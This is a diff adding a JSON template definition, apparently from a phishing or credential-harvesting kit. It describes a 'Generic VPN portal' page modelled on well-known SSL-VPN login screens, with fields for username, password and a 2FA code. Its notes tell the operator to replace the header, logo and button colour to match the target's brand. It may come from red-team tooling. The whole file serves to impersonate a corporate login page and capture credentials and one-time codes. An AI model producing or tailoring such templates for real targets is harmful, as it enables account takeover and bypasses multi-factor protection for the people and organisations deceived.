@@ -1,0 +1,8 @@
+{
+  "name": "Generic VPN portal",
+  "description": "Single-page user / password / OTP form modeled after typical SSL-VPN landing pages (Fortinet, Cisco AnyConnect, Palo Alto GlobalProtect). Generic styling — operator drops in the target's logo + colors.",
+  "pattern": "single-page",
+  "has_2fa": true,
+  "fields": ["username", "password", "code_2fa"],
+  "placeholder_notes": "Replace [Corporate VPN] header with the target's actual product name + logo. The 'Connect' button color (#1a73e8) is generic blue; match the target's brand."
+}
